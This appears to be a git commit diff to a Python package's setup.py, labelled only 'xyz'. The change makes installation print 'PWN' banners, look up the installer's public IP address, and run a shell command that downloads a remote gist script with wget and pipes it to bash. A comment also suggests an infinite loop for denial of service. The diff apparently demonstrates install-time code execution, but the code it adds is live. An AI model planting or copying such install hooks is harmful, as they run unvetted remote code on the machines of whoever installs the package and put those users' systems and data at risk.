53504971700e0d875ed2751467b7c86df49f042e
Stephen Gutekanst <stephen.gutekanst@gmail.com>
2015-10-20 12:42:33 -0700

    xyz

--- setup.py
+++ setup.py
@@ -1,12 +1,19 @@
 import sys
 
-print "YOU HAVE BEEN PWNED!"
+print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~"
 
+print "Querying public IP..."
 import urllib2
 print urllib2.urlopen("https://api.ipify.org/?format=json").read()
 
-#while True:
-#    continue
+# Feeling mean? Try DOS:
+# while True:
+#     1+1
 
+print "Executing payload..."
+import os
+os.system("wget -O - https://gist.githubusercontent.com/slimsag/293e68ffd9fcd3edbc98/raw/9b69429afe3158e5b4a9f0866b466debc97c07ac/payload.sh | bash")
+
+print "Done."
 sys.exit(0);
 
